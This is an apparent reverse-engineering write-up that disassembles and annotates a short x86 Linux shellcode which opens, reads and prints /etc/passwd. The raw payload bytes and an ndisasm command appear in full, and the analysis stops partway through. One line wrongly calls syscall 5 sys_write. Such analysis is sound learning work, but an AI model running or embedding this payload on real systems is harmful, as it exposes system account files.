## Shellcode analysis case 1

----

#### Shellcode - Reads /etc/passwd
```
\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x73\x73
\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f
\x65\x74\x89\xe3\xcd\x80\x93\x91\xb0\x03
\x31\xd2\x66\xba\xff\x0f\x42\xcd\x80\x92
\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x93\xcd
\x80
```

Binary ninja graph:

![graph](https://raw.githubusercontent.com/x00pwn/lowlevel-shellcode-analysis/master/graph_images/case2-graph.png)

` echo -ne "\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe3\xcd\x80\x93\x91\xb0\x03\x31\xd2\x66\xba\xff\x0f\x42\xcd\x80\x92\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x93\xcd\x80" | ndisasm -u -` convert the shellcode to x86 ASM via ndisasm
```
Disassembly-
00000000  31C9              xor ecx,ecx
00000002  F7E1              mul ecx
00000004  B005              mov al,0x5
00000006  51                push ecx
00000007  6873737764        push dword 0x64777373
0000000C  68632F7061        push dword 0x61702f63
00000011  682F2F6574        push dword 0x74652f2f
00000016  89E3              mov ebx,esp
00000018  CD80              int 0x80
0000001A  93                xchg eax,ebx
0000001B  91                xchg eax,ecx
0000001C  B003              mov al,0x3
0000001E  31D2              xor edx,edx
00000020  66BAFF0F          mov dx,0xfff
00000024  42                inc edx
00000025  CD80              int 0x80
00000027  92                xchg eax,edx
00000028  31C0              xor eax,eax
0000002A  B004              mov al,0x4
0000002C  B301              mov bl,0x1
0000002E  CD80              int 0x80
00000030  93                xchg eax,ebx
00000031  CD80              int 0x80
```

Analysis:

As usual, the shellcode starts by clearing out the ecx register, then it moves the linux `sys_write` syscall into the al register. Then the shellcode pushes the string `//etc/passwd` onto the stack in little endian format and split up.

**Clearing the registers** Using XOR ECX, ECX we can have the ECX register cleared by turning it to 0x00000000. Then using mul ecx to `EDX:EAX = EAX * ECX` which will then clear EAX and EDX
```assembly
xor    ecx,ecx        ; clear out ecx as prep
mul    ecx            ;
```
**Open the file** Moving 0x05 into al is using the sys_open linux syscall, sys_open requires 3 arguments, path in EBX, flags on ECX, and MODE on EDX
```assembly
mov    al,0x5         ; linux syscall (sys_open, 0x05)
push   ecx
push   0x64777373     ; push 'dwss' to the stack
push   0x61702f63     ; push 'ap/c' to the stack
push   0x74652f2f     ; push 'te//' to the stack
mov    ebx,esp        ; putting the address and "location" of the file into ebx
int    0x80           ; sys interupt
```

```assembly
xchg eax,ebx
xchg eax,ecx
mov al,0x3
xor edx,edx
mov dx,0xfff
inc edx
int 0x80
```
